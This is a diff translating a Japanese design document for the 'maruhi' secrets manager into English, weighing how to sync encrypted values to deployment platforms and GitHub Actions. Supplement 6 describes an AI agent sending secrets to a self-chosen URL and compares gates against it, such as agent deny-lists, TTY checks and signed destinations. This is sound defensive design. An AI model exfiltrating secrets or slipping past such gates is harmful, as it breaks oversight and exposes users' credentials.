-- 平文: ランタイムのメモリのみ。同期先のストアに残らない。自動化: 不要(常に最新)。コスト: **SDK の実装**(§5)+ 起動時の maruhi 依存(可用性 G8)
-- 評価 **○(SDK テーマへ送る)**: 同期の上位互換になり得るのは「アプリのコードを変えられる」場合だけ。既製ツールや設定ファイルで値を要求される場面には効かない。同期と SDK は両方要る(役割が違う)
+**Option S9. Not sync — "let them come fetch" (pull side = runtime SDK + OIDC lease)**
+On platforms that can issue workload identity — Vercel (`VERCEL_OIDC_TOKEN`), AWS, GCP, K8s, GitLab — the app takes a lease from maruhi at startup and decrypts, so **no plaintext needs to sit in the destination at all**. The existing lease design is issuer-generic (CRYPTO_SPEC §6.2 lease_policy), so Vercel OIDC fits as-is.
+- Plaintext: the runtime's memory only; nothing left in the destination's store. Automation: unneeded (always current). Cost: **the SDK implementation** (§5) + a startup-time dependency on maruhi (availability G8)
+- Verdict **○ (hand to the SDK theme)**: sync can only be strictly superseded when "the app's code can be changed". It does not help where an off-the-shelf tool or config file demands a value. Sync and SDK are both needed (different roles)
 
-**案 S10. 暗号文を同期し、ランタイムで復号(SOPS 型)**
-同期先には暗号文だけを置き、鍵はリースで取る。同期先のストア漏洩単体では何も漏れない。
-- 評価 **△**: S9 ができるなら値そのものをリースで取ればよく、暗号文を先に置く理由が薄い(ネットワーク 1 往復の節約と、オフライン耐性程度)。ROADMAP の「SOPS 互換エクスポート(明示操作)」の範囲に留める
+**Option S10. Sync ciphertext and decrypt at runtime (SOPS style)**
+Only ciphertext sits at the destination; the key is fetched via lease. A leak of the destination store alone leaks nothing.
+- Verdict **△**: if S9 is possible, you may as well lease the value itself; pre-placing ciphertext buys little (one network round trip saved, plus some offline tolerance). Keep it inside the ROADMAP's "SOPS-compatible export (explicit operation)" scope
 
-**案 S11. 同期先ネイティブの参照解決(External Secrets Operator プロバイダ等)**
-K8s の ESO、AWS の Secrets Manager 参照のように「プラットフォーム側が取りに来る」仕組みに maruhi プロバイダを書く。
-- 評価 **△**: 実体は S7(常駐プロセスが受信者)か S9(ワークロード ID)のどちらか。K8s は SA トークン = OIDC なので S9 の一形態。ESO プロバイダは需要が出たら S9 の薄い皮として
+**Option S11. Destination-native reference resolution (External Secrets Operator provider, etc.)**
+Write a maruhi provider for mechanisms where "the platform side comes to fetch", like K8s ESO or AWS Secrets Manager references.
+- Verdict **△**: in substance it is either S7 (a resident process is the recipient) or S9 (workload ID). K8s is an S9 instance since SA tokens = OIDC. An ESO provider is a thin skin over S9 if demand appears
 
-**案 S12. Cloudflare 内部の service binding をワークロード ID にする(セルフホスト限定)**
-セルフホストでは maruhi サーバーとユーザーの Worker が同一アカウントにあり、service binding は偽装不能な呼び出し元識別になる。ユーザーの Worker は トークンなしで maruhi にリースを要求できる。
-- 評価 **△(面白いが後)**: Cloudflare ユーザーが対象層なので固有の強みになりうる。ただし Workers には `wrangler secret` があり、S1 のレシピで足りることが多い。値の変更頻度が高い場合にだけ効く
+**Option S12. Make a Cloudflare-internal service binding the workload ID (self-hosted only)**
+Self-hosted, the maruhi server and the user's Worker share the account, and a service binding is an unforgeable caller identity. The user's Worker can request a lease from maruhi tokenless.
+- Verdict **△ (interesting, but later)**: could be a unique strength since Cloudflare users are the target population. But Workers have `wrangler secret`, which S1 recipes often suffice for. Only pays off when values change frequently
 
-**案 S13. 双方向同期・同期先からの取り込み**
-- 評価 **×**: ADR-0014 ガードレール(`.env` 世界観への寄り戻し)。maruhi が正、同期は一方通行
+**Option S13. Bidirectional sync / importing from the destination**
+- Verdict **×**: ADR-0014 guardrail (relapsing into the `.env` worldview). maruhi is the source of truth; sync is one-way
 
-これ以上の新案: 「同期先ごとに専用 Worker を運営が提供」は S5 の変形、「ブラウザ拡張で同期」は ADR-0018 違反、「同期先のトークンを運営が預かる」は S5 の劣化形。打ち止め。
+No further new options: "the operator provides a dedicated Worker per destination" is an S5 variant; "sync via browser extension" violates ADR-0018; "the operator holds the destination token" is a degraded S5. Enumeration closed.
 
-### 評価のまとめ
+### Evaluation summary
 
-| 案 | 平文の場所 | 運営は | 自動化 | コスト | 評価 |
+| Option | Plaintext location | The operator | Automation | Cost | Verdict |
 |---|---|---|---|---|---|
-| S1 レシピ | 各人の機械 | 読めない | なし | 極小 | ○ 土台 |
-| S2 `maruhi sync`(CLI) | 各人の機械 | 読めない | なし | 小〜中 | ◎ |
-| S3 CI から sync | CI ランナー | 持てるが復号しない | あり | 小 | ◎ |
-| S4 変更通知 | なし | — | (S3 を即時化) | 小 | ◎ |
-| S5 サーバー復号 push | サーバー | **扱う** | 完璧 | 中 | ○ セルフホスト / △ ホステッド |
-| S6 sealed box 中継 | 各人の機械 | 読めない | あり | 中 | ○ GitHub 限定・後続 |
-| S7 ユーザー所有エージェント | ユーザーの Worker | 読めない | あり | 大(仕様改訂) | △ 後続 |
-| S8 汎用アダプタ | (S2 の作り) | — | — | — | ○ 採用 |
-| S9 プル側(SDK) | ランタイム | 持てるが復号しない | 不要 | 大(SDK) | ○ §5 へ |
-| S10 暗号文同期 | — | — | — | 中 | △ |
-| S11 ESO 等 | — | — | — | 中 | △ |
-| S12 service binding | ランタイム | 読めない | 不要 | 中 | △ セルフホスト固有 |
-| S13 双方向 | — | — | — | — | × |
+| S1 recipes | each person's machine | cannot read | none | minimal | ○ foundation |
+| S2 `maruhi sync` (CLI) | each person's machine | cannot read | none | small–medium | ◎ |
+| S3 sync from CI | CI runner | can hold but does not decrypt | yes | small | ◎ |
+| S4 change notification | none | — | (makes S3 immediate) | small | ◎ |
+| S5 server decrypts + push | the server | **handles** | perfect | medium | ○ self-hosted / △ hosted |
+| S6 sealed-box relay | each person's machine | cannot read | yes | medium | ○ GitHub-only, follow-up |
+| S7 user-owned agent | the user's Worker | cannot read | yes | large (spec revision) | △ follow-up |
+| S8 generic adapter | (how S2 is built) | — | — | — | ○ adopted |
+| S9 pull side (SDK) | the runtime | can hold but does not decrypt | unneeded | large (SDK) | ○ → §5 |
+| S10 ciphertext sync | — | — | — | medium | △ |
+| S11 ESO etc. | — | — | — | medium | △ |
+| S12 service binding | the runtime | cannot read | unneeded | medium | △ self-hosted only |
+| S13 bidirectional | — | — | — | — | × |
 
-### 推奨
+### Recommendation
 
-1. **S1 + S2(S8 の作りで)+ S3 + S4 をひとまとまりで実装する。** これで「値を変えた人が同期する」(S2)と「CI が自動で追随する」(S3 + S4)の両方が、運営に平文を渡さずに成立する。プリセットの初期集合は Cloudflare Workers / Vercel / Netlify(対象層と重なる 3 つ)。AWS SM / GCP SM は S8 のプリセット追加で後から
-2. **S5 はセルフホスト向けオプションとして後続**(`grant_server` 済みプロジェクトの追加機能。自分のアカウントなので信頼の増分がない)。ホステッドには出さない方針を先に決めておく(出すなら ADR-0002 / 0014 の改訂として提示)
-3. **S6 は GitHub 向けの需要(既製アクション・Dependabot)が観測されたら**。「サーバーが読めない自動同期」として LP でも語れる珍しい形なので、需要次第では価値が大きい
-4. **S7 / S12 は仕様改訂を伴うので、招待制ベータでの声を待つ**
-5. LP での言い方: "Sync happens on your machine or in your CI. The server only relays 'something changed'." 競合が持つ「サーバーが同期する」を否定せず、「誰が運ぶか」の違いとして書く
+1. **Implement S1 + S2 (built the S8 way) + S3 + S4 as one body of work.** That achieves both "the person who changed a value syncs it" (S2) and "CI follows automatically" (S3 + S4) without handing plaintext to the operator. The initial preset set is Cloudflare Workers / Vercel / Netlify (the three overlapping the target population). AWS SM / GCP SM come later as S8 preset additions
+2. **S5 is a follow-up self-hosted option** (an added feature for `grant_server`-ed projects; your own account, so no trust increment). Decide now not to ship it hosted (if we ever do, present it as a revision of ADR-0002 / 0014)
+3. **S6 waits for observed GitHub-side demand (off-the-shelf actions, Dependabot)**. It is a rare form — "automated sync the server cannot read" — that the LP can talk about, so it could be worth a lot if demand appears
+4. **S7 / S12 come with spec revisions, so wait for invite-beta feedback**
+5. How to say it on the LP: "Sync happens on your machine or in your CI. The server only relays 'something changed'." Do not deny the competitors' "the server syncs"; write it as a difference in "who carries it"
 
 ---
 
-### 補足 1: 同期先の候補(第 2 陣以降 — 2026-09-04 追記)
+### Supplement 1: candidate sync destinations (second wave onward — added 2026-09-04)
 
-初期プリセットは Cloudflare Workers / Vercel / Netlify(所有者決定。**実装状況(2026-09-08)**: Cloudflare Workers / Vercel = exec + http〔SY2〕、Netlify = http のみ〔SY4 第 1 波 — 下の「SY4 実装時の裁定録」〕)。その後の候補を 4 系統で整理する。「アダプタで足りる」= SY2 の汎用 HTTP アダプタのプリセット(設定)で済むもの、「専用」= 認証方式が特殊で専用コードが要るもの。
+The initial presets are Cloudflare Workers / Vercel / Netlify (owner's decision. **Implementation status (2026-09-08)**: Cloudflare Workers / Vercel = exec + http [SY2], Netlify = http only [SY4 wave 1 — see "SY4 implementation-time ruling record" below]). Later candidates are organized into four families. "Adapter suffices" = what SY2's generic HTTP adapter presets (config) cover; "dedicated" = the auth scheme is special and needs dedicated code.
 
-| 系統 | 候補 | 作り | 備考 |
+| Family | Candidates | Built as | Notes |
 |---|---|---|---|
-| PaaS(対象層に近い) | Railway、Render、Fly.io、Deno Deploy、Supabase(Edge Functions の secrets)、Cloudflare Pages、Expo EAS、Heroku、DigitalOcean App Platform | ほぼアダプタ | Railway / Fly.io は GraphQL。優先度は対象層(JS で Web を作る個人・小チーム)に近い順 |
-| CI | GitHub Actions secrets(sealed box。Dependabot / Codespaces も同方式)、GitLab CI variables、CircleCI contexts、Bitbucket | GitHub は専用(公開鍵封印 — S6 と同じ部品)、他はアダプタ | 既製アクションが `${{ secrets.X }}` を要求する場面が多く需要が濃い(Shelve が唯一の統合先に選んだ) |
-| クラウドの秘密ストア(企業寄り) | AWS Secrets Manager / SSM Parameter Store、GCP Secret Manager、Azure Key Vault、HashiCorp Vault、1Password | 専用(AWS = SigV4 署名、GCP = サービスアカウント JWT、Azure = Entra ID) | SigV4 はローテーションの AWS コネクタ(§4 R2)と共用 |
-| コンテナ基盤 | Kubernetes Secrets(CI から kubectl)、Docker Swarm | レシピで足りることが多い | |
+| PaaS (close to the target population) | Railway, Render, Fly.io, Deno Deploy, Supabase (Edge Functions secrets), Cloudflare Pages, Expo EAS, Heroku, DigitalOcean App Platform | mostly adapter | Railway / Fly.io are GraphQL. Priority ordered by proximity to the target population (individuals and small teams building web apps in JS) |
+| CI | GitHub Actions secrets (sealed box; Dependabot / Codespaces work the same way), GitLab CI variables, CircleCI contexts, Bitbucket | GitHub is dedicated (public-key sealing — same component as S6); the rest are adapter | Many cases where off-the-shelf actions require `${{ secrets.X }}` — demand is dense (the only integration Shelve chose) |
+| Cloud secret stores (enterprise-leaning) | AWS Secrets Manager / SSM Parameter Store, GCP Secret Manager, Azure Key Vault, HashiCorp Vault, 1Password | dedicated (AWS = SigV4 signing, GCP = service-account JWT, Azure = Entra ID) | SigV4 is shared with the rotation AWS connector (§4 R2) |
+| Container platforms | Kubernetes Secrets (kubectl from CI), Docker Swarm | often a recipe suffices | |
 
-プリセットは設定ファイルなので、外部からの寄贈を受けやすい形(スキーマ + テスト用のモック応答)にしておき、対応先の数を追わない。
+Presets are config files, so keep them in a contribution-friendly form (schema + mock responses for tests) and do not chase destination counts.
 
-### 補足 2: S4(変更通知)の送信経路 — 設計論点(2026-09-04 追記)
+### Supplement 2: S4 (change notification) delivery paths — design points (added 2026-09-04)
 
-S4 は「呼び鈴であって配達ではない」: 通知には値も変数名も project_id も載せない。サーバーが平文を持たない以上、自動化に貢献できるのは「タイミングを知らせる」ことだけで、S4 はその最小形。S4 なしの S3 は `schedule`(10 分ごと等)か手動起動になり、反映まで最大その間隔の遅れが出る。
+S4 is "a doorbell, not delivery": the notification carries no value, no variable name, no project_id. Since the server holds no plaintext, the only thing it can contribute to automation is "reporting the timing", and S4 is the minimal form of that. S3 without S4 becomes `schedule` (every 10 minutes, say) or manual dispatch, with up to that interval of lag before reflection.
 
-GitHub の `repository_dispatch` は認証が要るため、サーバーが GitHub を呼ぶ資格を持つ必要がある。選択肢は 2 つ:
+GitHub's `repository_dispatch` requires auth, so the server needs a credential to call GitHub. Two choices:
 
-- **maruhi の GitHub App(OAuth App とは別)を登録し、ユーザーがリポジトリにインストールする**。サーバーはインストールトークンを都度発行して呼ぶ(`contents: write` 相当の権限)。ユーザーのトークンを預からずに済む。Shelve と同じ方式。運営(セルフホストでは各運営者)が App を 1 つ登録する人間タスクが要る — hosted-design.md §7 の L 系列に追加候補
-- **汎用 webhook(HMAC 署名付き POST)** をユーザー任意の URL へ送る。GitHub 以外にも使えるが、受け口はユーザーが用意する。任意 URL は SSRF・流出面の検査が要る(§8 項 2)
+- **Register a maruhi GitHub App (distinct from the OAuth App) and have users install it on their repositories**. The server mints an installation token per call (`contents: write`-equivalent permission). No need to hold users' tokens. Same approach as Shelve. It requires a human task: the operator (each operator, when self-hosted) registers one App — an addition candidate for the L series in hosted-design.md §7
+- **Generic webhook (HMAC-signed POST)** to a user-chosen URL. Works beyond GitHub, but the user provides the receiving end. Arbitrary URLs need SSRF / exfiltration review (§8 item 2)
 
-**推奨(2026-09-04)**: 両方持ち、順序は汎用 → GitHub App。理由: (1) 将来の送信先の大半は「URL に POST」で足りる — Vercel / Netlify の deploy hook は認証なしの秘匿 URL、GitLab の pipeline trigger はトークンをボディに載せるだけ、GitHub も fine-grained PAT を静的ヘッダに置けば動く。汎用の形(URL + 静的ヘッダ + HMAC 署名 + 既知ホスト allowlist)が基本形で、GitHub App はその上の「認証モード」(静的ヘッダの代わりにインストールトークンを都度発行)にすぎない。(2) セルフホストでは App 登録を強いない経路が要る。(3) ホステッドで PAT を預かるのは避けたいので、GitHub App を後から足して PAT 経路を推奨から外す。注意点: 静的ヘッダに置く資格はサーバー(運営)が読める統合用の資格であり、maruhi の E2EE 値ではない — 認証なしの deploy hook を第一選択として案内し、PAT は最小権限(`contents: write` のみ・リポジトリ限定)を求める。**所有者裁定待ち**。
+**Recommendation (2026-09-04)**: have both, ordered generic → GitHub App. Reasons: (1) most future destinations are covered by "POST to a URL" — Vercel / Netlify deploy hooks are unauthenticated secret URLs, GitLab's pipeline trigger just puts a token in the body, and even GitHub works with a fine-grained PAT in a static header. The generic form (URL + static header + HMAC signature + known-host allowlist) is the base form, and GitHub App is merely an "auth mode" on top of it (minting an installation token per call instead of a static header). (2) Self-hosted needs a path that does not force App registration. (3) We want to avoid holding PATs hosted, so add GitHub App later and drop the PAT path from the recommendation. Caveat: a credential in a static header is an integration credential the server (operator) can read, not a maruhi E2EE value — steer users toward unauthenticated deploy hooks first, and require minimal scope for a PAT (`contents: write` only, repository-scoped). **Awaiting owner ruling**.
 
-### 補足 4: S4(変更通知)の上位互換を探す(2026-09-04 — 所有者依頼の再探索)
+### Supplement 4: searching for a superset of S4 (change notification) (2026-09-04 — re-exploration at the owner's request)
 
-前提の事実: **maruhi の値を変えられるのは人間のメンバーだけ**(値には署名が要り、サーバーも CI も署名鍵を持たない — §1)。したがって**値が変わる瞬間には必ず書き手の CLI がオンラインで存在する**。S6(sealed box 中継)を成立させたのと同じ観察であり、これが変更通知そのものを不要にできる。
+Underlying fact: **only a human member can change a maruhi value** (a value requires a signature; neither the server nor CI holds a signing key — §1). Therefore **the writer's CLI is always online at the moment a value changes** — the same observation that made S6 (sealed-box relay) work, and it can make change notification itself unnecessary.
 
-| 案 | 何をするか | 評価 |
+| Option | What it does | Verdict |
 |---|---|---|
-| N1. **push 時同期(書き手の CLI が同期する)** | プロジェクトに同期設定があれば、`maruhi push` の直後に書き手の CLI が S2 の同期をその場で実行する。サーバー・webhook・CI のいずれも関与しない | **◎ 銀の弾丸に最も近い**。遅延ゼロ・サーバー側の資格ゼロ・仕様改訂ゼロ。変更の 100% を覆う(変更元は常に人間の CLI)。残るのは「書き手の機械から同期先へ届かない」「同期先トークンを全 writer が持つ」の 2 点 |
-| N2. **CI の定期突合(reconcile)を保険にする** | SY3 の workflow を `schedule`(例: 毎日)で走らせ、maruhi と同期先の差分を埋める。N1 の失敗(ネットワーク・途中終了)を拾う | **◎ N1 と一体**。webhook 不要。「同期漏れ」が最大 1 日で自己修復 |
-| N3. 汎用 webhook(URL + 静的ヘッダ + HMAC + allowlist) | 補足 2 の基本形 | ○ **「CI からしか同期しない」チーム**(同期先トークンを個人の機械に置かない運用)の即時化に限って要る。それ以外は N1 + N2 で足りる |
-| N4. GitHub App 認証モード | 補足 2 | ○ N3 の上に後から。ホステッドで PAT を預からないため |
-| N5. ユーザー所有の中継 Worker(テンプレート) | サーバーは秘匿 URL の Worker へ通知し、Worker が PAT / App を持って GitHub を呼ぶ | △ N3 の送信先が「ユーザーの Worker」になるだけ。機構としては N3 に含まれる。レシピ(テンプレート)として提供すれば運営が資格を持たない形になる |
-| N6. リポジトリへのコミットで通知(`on: push` を起こす) | bot がファイルを更新して push | × N4 と同じ権限が要り、履歴を汚す |
-| N7. 同期先側のポーリング | 同期先が maruhi を見に来る | × Vercel / Netlify にその機構はない(K8s の ESO は §3 S11) |
+| N1. **Sync-on-push (the writer's CLI syncs)** | If the project has sync config, the writer's CLI runs the S2 sync right after `maruhi push`. No server, webhook, or CI involved | **◎ closest to a silver bullet**. Zero delay, zero server credentials, zero spec revision. Covers 100% of changes (the change origin is always a human CLI). Two remainders: "cannot reach the destination from the writer's machine" and "every writer holds the destination token" |
+| N2. **Periodic CI reconciliation as a safety net** | Run the SY3 workflow on a `schedule` (e.g. daily) to fill any gap between maruhi and the destination. Catches N1 failures (network, interruption) | **◎ integral to N1**. No webhook needed. A "missed sync" self-heals within a day at most |
+| N3. Generic webhook (URL + static header + HMAC + allowlist) | The supplement-2 base form | ○ Needed only to make immediate the workflow of **"teams that sync only from CI"** (destination tokens not on personal machines). Everything else is covered by N1 + N2 |
+| N4. GitHub App auth mode | Supplement 2 | ○ Added on top of N3 later, so hosted never holds a PAT |
+| N5. User-owned relay Worker (template) | The server notifies a secret-URL Worker, which holds a PAT / App and calls GitHub | △ Just makes N3's destination "the user's Worker"; as a mechanism it is inside N3. Providing it as a recipe (template) keeps credentials off the operator |
+| N6. Notify by committing to the repository (triggers `on: push`) | A bot updates a file and pushes | × Needs the same permission as N4 and pollutes history |
+| N7. Destination-side polling | The destination comes to look at maruhi | × Vercel / Netlify have no such mechanism (K8s ESO is §3 S11) |
 
-**結論**: 変更通知(S4 = SY6)は「上位互換の N1 + N2 があるので既定経路から外し、N3 は『CI からしか同期しない』運用の需要が出たら」に降格できる。N1 の 2 つの残余への手当て:
-- **届かない**: push 後の同期失敗は「未同期」の印を返し、次回の `maruhi sync` / N2 が回収する(印はメタデータ — 値ではない)
-- **全 writer がトークンを持つ**: 同期先トークンは専用環境(例: `_sync`)の変数として保存する。role はプロジェクト単位(CRYPTO_SPEC §6.2)なので全メンバーが読めるのは事実。分離したいチームは N3(CI からのみ同期)を選ぶ — これが N3 の存在理由
+**Conclusion**: change notification (S4 = SY6) can be demoted to "off the default path because the supersets N1 + N2 exist; N3 waits for demand from the 'sync only from CI' mode of operation". Remedies for N1's two remainders:
+- **Unreachable**: a failed post-push sync returns a "not synced" marker and the next `maruhi sync` / N2 picks it up (the marker is metadata — not a value)
+- **Every writer holds the token**: store the destination token as a variable in a dedicated environment (e.g. `_sync`). Roles are per-project (CRYPTO_SPEC §6.2), so it is true that every member can read it. Teams that want separation choose N3 (sync only from CI) — that is N3's reason to exist
 
-N1 の付帯設計: 同期は環境ごとの opt-in(`autoSync`)とし、production は既定で手動(`maruhi sync` を人が打つ)・preview / development は自動、のような既定を置ける。
+N1's accompanying design: sync is per-environment opt-in (`autoSync`), with defaults like production = manual by default (a human runs `maruhi sync`) and preview / development = automatic.
 
-### 補足 5: SY5 第 2 段(GitHub secrets のネイティブ封印)の上位互換を探す(2026-09-04)
+### Supplement 5: searching for a superset of SY5 stage 2 (native sealing of GitHub secrets) (2026-09-04)
 
-問題: GitHub の secrets API はリポジトリ公開鍵への libsodium sealed box(X25519 + XSalsa20-Poly1305 + BLAKE2b ノンス)を必須とし、XSalsa20 と BLAKE2b は WebCrypto にない。
+Problem: GitHub's secrets API mandates a libsodium sealed box to the repository public key (X25519 + XSalsa20-Poly1305 + BLAKE2b nonce), and WebCrypto has neither XSalsa20 nor BLAKE2b.
 
-| 案 | 内容 | 評価 |
+| Option | Content | Verdict |
 |---|---|---|
-| G1. `gh secret set` を手元で使うレシピ(第 1 段) | `maruhi run -- sh -c 'printenv X \| gh secret set X'`。`gh` が封印する | ○ 依存追加なし。手動 |
-| G2. **CI 上で `gh secret set`(自動化)** | GitHub のランナーには `gh` が同梱。SY3 の workflow 内で `maruhi ci run -- sh -c '… gh secret set …'`。`GITHUB_TOKEN` は secrets を書けないので、`secrets: write` を持つ fine-grained PAT か App トークンを 1 つ bootstrap として GitHub secret に置く(または maruhi の変数として `ci run` で取り出す) | **◎ 上位互換**。依存追加なし・自動化あり・Dependabot / Codespaces も `--app dependabot` / `--app codespaces` で同じ |
-| G3. CLI に暗号ライブラリを追加(libsodium-wrappers または `@noble/ciphers` + `@noble/curves` + `@noble/hashes`) | ネイティブプリセット | △ 規律の例外承認が要る。G1 / G2 で足りる限り不要。採るなら noble 系(監査済み・純 JS・木揺らし可)を同期プリセットのモジュールに隔離し、`packages/crypto` には入れない |
-| G4. WebCrypto の X25519 + 自前 XSalsa20 / BLAKE2b | — | × 「独自プリミティブの実装」そのもの。禁止 |
-| G5. WebAssembly 版 libsodium | — | △ G3 と同じ分類でサイズが大きい |
-| G6. `$GITHUB_ENV` に書いて後続ステップへ渡す(既製アクションの `${{ secrets.X }}` を `${{ env.X }}` に置き換える) | secrets 同期そのものを回避 | △ ランナーのファイルに平文が書かれる(ランナー自身の機構ではあるが、`.env` 系出力を作らない規律の精神に反する)。**採らない**。同一ステップ内で `maruhi ci run -- <third-party CLI>` にする案内で代替 |
-| G7. OIDC フェデレーションで secrets 自体を減らす | クラウド資格は OIDC → STS | ○ 立場として docs へ(§4 R7 / §6 D5)。サードパーティ API キーには効かない |
-| G8. sealed box 中継(S6) | サーバーが封印物を転送 | △ クライアント側で封印する時点で G3 の依存が要る。G2 があれば不要 |
+| G1. A recipe using `gh secret set` locally (stage 1) | `maruhi run -- sh -c 'printenv X \| gh secret set X'`. `gh` does the sealing | ○ no dependency added. Manual |
+| G2. **`gh secret set` on CI (automation)** | GitHub runners ship `gh`. Inside the SY3 workflow: `maruhi ci run -- sh -c '… gh secret set …'`. `GITHUB_TOKEN` cannot write secrets, so place one bootstrap credential — a fine-grained PAT or App token with `secrets: write` — as a GitHub secret (or store it as a maruhi variable and fetch it via `ci run`) | **◎ the superset**. No dependency, automated, Dependabot / Codespaces work identically via `--app dependabot` / `--app codespaces` |
+| G3. Add a crypto library to the CLI (libsodium-wrappers or `@noble/ciphers` + `@noble/curves` + `@noble/hashes`) | A native preset | △ needs a rule-exception approval. Unneeded while G1 / G2 suffice. If adopted, use the noble family (audited, pure JS, tree-shakeable), isolate it in the sync-preset module, and keep it out of `packages/crypto` |
+| G4. WebCrypto X25519 + hand-rolled XSalsa20 / BLAKE2b | — | × literally "implementing your own primitives". Forbidden |
+| G5. WebAssembly libsodium | — | △ same class as G3 but larger |
+| G6. Write to `$GITHUB_ENV` to pass to a later step (replace an off-the-shelf action's `${{ secrets.X }}` with `${{ env.X }}`) | Avoids secret sync itself | △ writes plaintext to a runner file (the runner's own mechanism, but against the spirit of the "no `.env`-style outputs" discipline). **Not adopted**. Substitute: steer to `maruhi ci run -- <third-party CLI>` within the same step |
+| G7. Reduce secrets themselves via OIDC federation | Cloud credentials via OIDC → STS | ○ to docs as a position (§4 R7 / §6 D5). Does not help with third-party API keys |
+| G8. Sealed-box relay (S6) | The server forwards the sealed object | △ sealing client-side already needs G3's dependency. Unneeded given G2 |
 
-**結論**: **第 2 段は不要と判断できる**。G1(手元)+ G2(CI で自動)で、依存追加なしに手動と自動の両方が揃う。G3 は「`gh` を入れられない環境」の声が出たときの再検討項目に留める。**(2026-09-08 SY5 で実装: G1 = Deploy targets のレシピ + `EXEC_PRESETS["github-actions"]`〔宣言 1 つ・依存追加ゼロ〕、G2 = 標準形 ② の sync step に bootstrap の `GH_TOKEN`〔GitHub Environment secret〕。G3 / G5 は取り込んでいない — 下の「SY5 実装時の裁定録」)**
+**Conclusion**: **stage 2 is judged unnecessary**. With G1 (local) + G2 (automatic in CI), both manual and automatic are covered with no added dependency. G3 stays as a re-consideration item for when a "can't install `gh`" voice appears. **(Implemented as SY5 on 2026-09-08: G1 = the Deploy targets recipe + `EXEC_PRESETS["github-actions"]`〔one declaration, zero added dependencies〕, G2 = standard form ②'s sync step with bootstrap's `GH_TOKEN`〔GitHub Environment secret〕. G3 / G5 were not taken in — see the "SY5 implementation-time ruling record" below)**
 
-### 補足 6: SY2 のエージェント環境の扱いの上位互換を探す(2026-09-04)
+### Supplement 6: looking for a superset for how SY2 treats agent environments (2026-09-04)
 
-問題の本質: 危険なのは「エージェントが `sync` を打つこと」ではなく、**「エージェントが送信先を選べること」**(自作プリセットの URL へ値を送り出せる)。現状の CLI では `push` はエージェント環境でも許可されており(agent-gate の対象は値表示と儀式のみ)、エージェントが値を書くこと自体は既に信頼している。
+The essence of the problem: what is dangerous is not "the agent running `sync`" but **"the agent choosing the destination"** (it can send values to a homemade preset's URL). In the current CLI, `push` is already allowed in agent environments (the agent gate covers only value display and ceremonies), and the agent writing values is already trusted.
 
-| 案 | 内容 | 評価 |
+| Option | Content | Evaluation |
 |---|---|---|
-| A1. 既知エージェント検出で `sync` を deny(deny-list) | 前回の推奨 | ○ 検出できないエージェントには効かない(fail-open) |
-| A2. `sync` を値表示と同じ 2 層 fail-closed(TTY 一次 + 検出二次)にする | 人間の TTY からしか打てない | ○ 強いが CI で打てなくなる → CI 用に別コマンドが要る(A3) |
-| A3. 人間用 `maruhi sync`(A2 の 2 層)と CI 用 `maruhi ci sync`(OIDC リースで身元が縛られる)に分ける | 呼び手の種類ごとにゲートを変える | ○ ADR-0016 決定 7 と整合。ただし N1(push 時同期)を非 TTY で動かせない |
-| A4. **送信先を署名で縛る(capability 型)** | 同期設定(プリセット id・同期先のプロジェクト / 環境 id・自作プリセットの定義)を **maruhi の変数として `_sync` 環境に保存**する。変数は §4.1 の書き込み署名と E2EE を自動的に受ける(仕様改訂ゼロ)。実行時の `sync` は**署名済み設定にある送信先へしか送れず、ローカルファイルの自作プリセットは読まない**。設定の変更(`maruhi sync config set` — 自作プリセットの登録を含む)を**儀式**とし、2 層 fail-closed(A2 と同じ)で守る | **◎ 上位互換**。安全性が「エージェントを検出できるか」でなく「送信先を人間が署名したか」に載る。検出できないエージェントにも効く。CI も N1 も同じ経路で動く |
-| A5. 一時的な承認窓(`sudo` 型: TTY で `sync approve --ttl 1h`) | 人間が短時間だけ非 TTY の同期を許す | △ A4 で足りる。複雑さの割に得るものが少ない |
-| A6. 差分表示 + 非 TTY では `--yes` 必須(Shelve 型) | — | × 誤操作ガードにしかならない |
-| A7. 監査行(`sync.executed` — プリセット id・環境のみ、値なし) | 事後検知 | ○ A4 の補完として必ず付ける |
-| A8. 環境ごとの自動同期フラグ(production は既定で手動) | 誤同期の範囲を狭める | ○ N1 の付帯設計として |
+| A1. Deny `sync` on known-agent detection (deny-list) | Previous recommendation | ○ does not work against undetected agents (fail-open) |
+| A2. Make `sync` the same 2-layer fail-closed as value display (primary TTY + secondary detection) | Can only be invoked from a human TTY | ○ strong but can no longer be invoked in CI → a separate CI command is needed (A3) |
+| A3. Split into human `maruhi sync` (A2's 2 layers) and CI `maruhi ci sync` (identity bound by an OIDC lease) | Vary the gate by caller kind | ○ consistent with ADR-0016 decision 7. But N1 (push-time sync) cannot run non-TTY |
+| A4. **Bind the destination by signature (capability type)** | Store the sync configuration (preset id, destination project / environment id, homemade preset definitions) **as maruhi variables in the `_sync` environment**. Variables automatically get §4.1 write signatures and E2EE (zero spec revision). At run time `sync` **can only send to destinations in the signed configuration and does not read local homemade presets**. Making configuration changes (`maruhi sync config set` — including registering a homemade preset) a **ceremony**, guarded by 2-layer fail-closed (same as A2) | **◎ superset**. Safety rests on "did a human sign the destination" rather than "can the agent be detected". Works against undetected agents. CI and N1 both run on the same path |
+| A5. Temporary approval window (`sudo` type: `sync approve --ttl 1h` at a TTY) | A human permits non-TTY sync for a short time | △ A4 suffices. Gains little for the complexity |
+| A6. Diff display + `--yes` required when non-TTY (Shelve type) | — | × only a mistake guard |
+| A7. Audit line (`sync.executed` — preset id and environment only, no values) | After-the-fact detection | ○ always attach as a complement to A4 |
+| A8. Per-environment auto-sync flag (production defaults to manual) | Narrow the scope of mistaken sync | ○ as an accessory design of N1 |
 
-**結論**: **A4 + A7 + A8 を推奨し、A1 を保険として残す**(既知エージェントは自作プリセットの登録儀式に入れない — これは A4 の儀式ゲートに自動的に含まれる。実行そのものは許可してよい: 送信先は署名済みで、値の書き込みは既に信頼している)。TTY 判定は儀式(設定変更)にだけ課し、実行(`sync`)には課さない — CI と N1 が非 TTY で動くため。
+**Conclusion**: **recommend A4 + A7 + A8, keep A1 as a fallback** (known agents are not admitted to the homemade-preset registration ceremony — this is automatically covered by A4's ceremony gate. The execution itself may be permitted: the destination is signed and writing values is already trusted). The TTY check applies only to the ceremony (configuration change), not to execution (`sync`) — CI and N1 run non-TTY.
 
-補足 4〜6 を合わせた同期の全体像: **「送信先は人間が署名で決め、同期は値を変えた人の CLI が即時に行い、CI が定期に突合し、監査に残る」**。サーバーは値も送信先の資格も持たず、変更通知も要らない。
+The whole picture of sync combining supplements 4–6: **"a human decides the destination by signature, the CLI of the person who changed the value syncs immediately, CI reconciles periodically, and it lands in the audit"**. The server holds neither the values nor the destination credentials, and no change notification is needed.
 
-### 補足 7: push 時同期の上位互換を探す — 第 3 ラウンド(2026-09-04)
